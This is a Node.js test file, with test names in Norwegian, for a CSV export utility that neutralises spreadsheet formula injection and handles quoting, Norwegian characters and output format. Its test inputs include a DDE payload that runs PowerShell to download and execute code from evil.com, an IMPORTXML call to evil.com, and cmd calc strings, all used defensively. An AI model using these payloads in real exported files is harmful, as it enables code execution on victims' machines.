import test from 'node:test';
import assert from 'node:assert/strict';
import { formatCsvCell, serializeToCsv } from '../src/utils/csvExport.js';

test('CSV Export - Nøytralisering av ondsinnede formelverdier', async (t) => {
  await t.test('prefikser med =, +, -, @ nøytraliseres med enkelt apostrof', () => {
    assert.equal(formatCsvCell('=cmd|\' /C calc\'!A0'), '"\'=cmd|\' /C calc\'!A0"');
    assert.equal(formatCsvCell('+2+3'), '"\'+2+3"');
    assert.equal(formatCsvCell('-10+20'), '"\'-10+20"');
    assert.equal(formatCsvCell('@SUM(A1:A10)'), '"\'@SUM(A1:A10)"');
  });

  await t.test('formler med innledende mellomrom eller tab nøytraliseres', () => {
    assert.equal(formatCsvCell('   =1+1'), '"\'   =1+1"');
    assert.equal(formatCsvCell('\t+123'), '"\'\t+123"');
    assert.equal(formatCsvCell('  @IMPORTXML("http://evil.com", "//a")'), '"\'  @IMPORTXML(""http://evil.com"", ""//a"")"');
  });

  await t.test('formler med innledende kontrolltegn (0x00-0x1F) nøytraliseres', () => {
    assert.equal(formatCsvCell('\x00=cmd'), '"\'\x00=cmd"');
    assert.equal(formatCsvCell('\x1F+calc'), '"\'\x1F+calc"');
    assert.equal(formatCsvCell('\x08-2+5'), '"\'\x08-2+5"');
    assert.equal(formatCsvCell('\r@malicious'), '"\'\r@malicious"');
  });

  await t.test('håndterer DDE- og macro-injeksjonsangrep', () => {
    const ddeAttack = '=cmd|\'/C powershell IEX(New-Object Net.WebClient).DownloadString("http://evil.com")\'!A0';
    const formatted = formatCsvCell(ddeAttack);
    assert.ok(formatted.startsWith('"\'='), 'Skal prefikses med apostrof for å avvæpne DDE');
    assert.ok(formatted.includes('""http://evil.com""'), 'Anførselstegn i formelen må escapes med doble anførselstegn');
  });
});

test('CSV Export - Håndtering av normale verdier og norske tegn', async (t) => {
  await t.test('vanlige tekststrenger beholdes uendret inni sitattegn', () => {
    assert.equal(formatCsvCell('Ola Nordmann'), '"Ola Nordmann"');
    assert.equal(formatCsvCell('post@hiskingdomministry.no'), '"post@hiskingdomministry.no"');
    assert.equal(formatCsvCell('+47 900 00 000'), '"\'+47 900 00 000"'); // Telefon med innledende + nøytraliseres trygt
  });

  await t.test('norske spesialtegn (æ, ø, å) bevares korrekt', () => {
    assert.equal(formatCsvCell('Blåbærsyltetøy og rødgrøt'), '"Blåbærsyltetøy og rødgrøt"');
    assert.equal(formatCsvCell('Ærlig Åsvald fra Ørsta'), '"Ærlig Åsvald fra Ørsta"');
  });

  await t.test('null og undefined produserer tomme felter', () => {
    assert.equal(formatCsvCell(null), '""');
    assert.equal(formatCsvCell(undefined), '""');
    assert.equal(formatCsvCell(''), '""');
  });

  await t.test('tall og boolske verdier formateres korrekt', () => {
    assert.equal(formatCsvCell(42), '"42"');
    assert.equal(formatCsvCell(0), '"0"');
    assert.equal(formatCsvCell(NaN), '""');
    assert.equal(formatCsvCell(true), '"Ja"');
    assert.equal(formatCsvCell(false), '"Nei"');
  });

  await t.test('anførselstegn og linjeskift i celler siteres iht RFC 4180', () => {
    assert.equal(formatCsvCell('Han sa "Halleluja"'), '"Han sa ""Halleluja"""');
    assert.equal(formatCsvCell('Linje 1\nLinje 2'), '"Linje 1\nLinje 2"');
  });
});

test('CSV Export - serializeToCsv full tabellserialisering', async (t) => {
  await t.test('starter med UTF-8 BOM (\\uFEFF) og bruker semikolon og CRLF', () => {
    const headers = ['Navn', 'E-post', 'Status'];
    const rows = [
      ['Ola Nordmann', 'ola@example.com', 'Mottatt'],
      ['Kari Nordmann', 'kari@example.com', 'Godkjent']
    ];

    const csv = serializeToCsv(headers, rows);

    // Må starte med UTF-8 BOM
    assert.ok(csv.startsWith('\uFEFF'), 'CSV må starte med UTF-8 BOM (\\uFEFF)');

    // Skal bruke semikolon som felt-skilletegn
    assert.ok(csv.includes('"Navn";"E-post";"Status"'));

    // Skal bruke CRLF (\r\n) mellom rader
    assert.ok(csv.includes('\r\n'));

    // Inneholder korrekte data
    assert.ok(csv.includes('"Ola Nordmann";"ola@example.com";"Mottatt"'));
    assert.ok(csv.includes('"Kari Nordmann";"kari@example.com";"Godkjent"'));
  });

  await t.test('beskytter mot formler i eksporterte tabeller med blandede data', () => {
    const headers = ['Navn', 'Kommentar', 'Verdi'];
    const rows = [
      ['=SUM(A1:A10)', 'Normal kommentar', 100],
      ['Hacker', '+cmd|"/C calc"!A0', '@ATTACK']
    ];

    const csv = serializeToCsv(headers, rows);

    assert.ok(csv.includes('"\'=SUM(A1:A10)";"Normal kommentar";"100"'));
    assert.ok(csv.includes('"Hacker";"\'+cmd|""/C calc""!A0";"\'@ATTACK"'));
  });
});
